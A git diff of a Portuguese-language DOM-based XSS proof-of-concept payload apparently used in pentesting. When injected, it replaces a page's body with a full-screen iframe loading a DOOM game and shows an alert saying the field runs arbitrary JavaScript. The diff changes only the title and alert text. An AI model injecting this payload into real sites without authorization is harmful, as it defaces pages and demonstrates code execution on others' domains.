@@ -6,9 +6,9 @@ console.log("Teste de XSS DOM Based by André Henrique!! Injetando payload! :D")
 // Sobrescrever o corpo do documento
 function inject() {
 	console.log("Stager: Injetando o iFrame...");
-	document.title = "DOOM > DOM, by Oficina de Seg Web Uniao Geek";
+	document.title = "DOOM > DOM, in Pentest by Andre Henrique";
 	document.getElementsByTagName('body')[0].innerHTML = '<iframe src="https://doom.fredrik-almroth.se/" allowfullscreen style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;">';
-	alert("ISH AVISA:\n\nSe vc estah lendo este aviso, o campo/field testado estah vulneravel a XSS DOM Based!\nIsto significa que um atacante, (eu rsrs) por exemplo,\npodera executar codigos JavaScript arbitrariamente no dominio " + document.domain + "!\n\nEntao, vamos provar isto jogando o DOOM!!");
+	alert("ISH AVISA:\n\nSe vc estah lendo este aviso, o campo/field testado estah vulneravel a XSS DOM Based!\nIsto significa que um atacante, podera executar codigos JavaScript arbitrariamente\nno dominio " + document.domain + "!\n\nEntao, vamos provar isto jogando o DOOM!!");
 }
 
 // Verificar se o DOM pode ser injetado imediatamente ou se deve ser chamado por meio de eventos
